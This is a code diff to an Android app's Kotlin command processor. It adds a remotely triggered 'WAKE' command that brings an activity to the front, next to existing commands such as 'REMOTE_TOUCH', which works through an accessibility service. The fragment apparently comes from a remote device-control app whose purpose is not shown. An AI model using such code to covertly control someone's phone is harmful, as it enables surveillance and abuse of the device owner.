@@ -247,6 +247,13 @@ object CommandProcessor {
                         ctx.startService(i)
                     }
                 }
+                "WAKE" -> {
+                    val intent = Intent(ctx, PulseActivity::class.java)
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
+                    if (content.contains("wellbeing")) intent.putExtra("route_to_settings", true)
+                    ctx.startActivity(intent)
+                    status = "SCREEN_WAKE_QUEUED"
+                }
                 "REMOTE_TOUCH" -> {
                     if (MyAccessibilityService.instance == null) {
                         status = "FAILED (SERVICE_OFF)"
